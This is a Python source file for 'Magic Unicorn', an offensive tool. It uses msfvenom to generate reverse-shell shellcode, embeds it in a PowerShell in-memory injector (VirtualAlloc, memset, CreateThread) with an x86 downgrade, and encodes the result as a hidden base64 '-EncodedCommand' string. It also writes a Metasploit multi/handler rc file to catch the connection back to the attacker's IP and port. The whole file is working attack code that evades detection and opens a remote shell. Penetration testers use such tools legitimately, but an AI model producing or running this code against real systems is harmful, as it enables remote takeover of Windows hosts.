#!/usr/bin/python
#
# Magic Unicorn - PowerShell downgrade attack tool
#
# Written by: Dave Kennedy (@dave_rel1k)
# Company: TrustedSec (@TrustedSec) https://www.trustedsec.com
#
# Real quick down and dirty for native x86 powershell on any platform
#
# Usage: python unicorn.py payload reverse_ipaddr port
# Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443
#
# Requirements: Need to have Metasploit installed.
#
import base64
import re
import subprocess
import sys

# generate base shellcode
def generate_shellcode(payload,ipaddr,port):
    port = port.replace("LPORT=", "")
    proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s c" % (payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # start to format this a bit to get it ready
    repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'buf=' : ''}
    data = reduce(lambda a, kv: a.replace(*kv), repls.iteritems(), data).rstrip()
    return data

def format_payload(payload, ipaddr, port):
    # generate our shellcode first
    shellcode = generate_shellcode(payload, ipaddr, port).rstrip()
    # sub in \x for 0x
    shellcode = re.sub("\\\\x", "0x", shellcode)
    # base counter
    counter = 0
    # count every four characters then trigger mesh and write out data
    mesh = ""
    # ultimate string
    newdata = ""
    for line in shellcode:
        mesh = mesh + line
        counter = counter + 1
        if counter == 4:
            newdata = newdata + mesh + ","
            mesh = ""
            counter = 0

    # heres our shellcode prepped and ready to go
    shellcode = newdata[:-1]
    
    # one line shellcode injection with native x86 shellcode
    powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" % (shellcode))
    full_attack = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + base64.b64encode(powershell_code.encode('utf_16_le'))  

    # write out powershell attacks
    filewrite = file("powershell_attack.txt", "w")
    filewrite.write(full_attack)
    filewrite.close()

    # write out rc file
    filewrite = file("msf.rc", "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n" % (payload,ipaddr,port))
    filewrite.close()

    print "[*] Exported powershell output code to powershell_attack.txt."
    print "[*] Exported Metasploit RC file as msf.rc. Run msfconsole -r msf.rc to execute."

# pull the variables needed for usage
try:

    payload = sys.argv[1]
    ipaddr = sys.argv[2]
    port = sys.argv[3]
    format_payload(payload,ipaddr,port)

# except out of index error
except IndexError:

    print r"""
                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  | 
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:
"""
    print "Real quick down and dirty for native x86 powershell on any platform"
    print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com"
    print "Happy Magic Unicorns."
    print "\n"
    print "Usage: python unicorn.py payload reverse_ipaddr port"
    print "Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443"
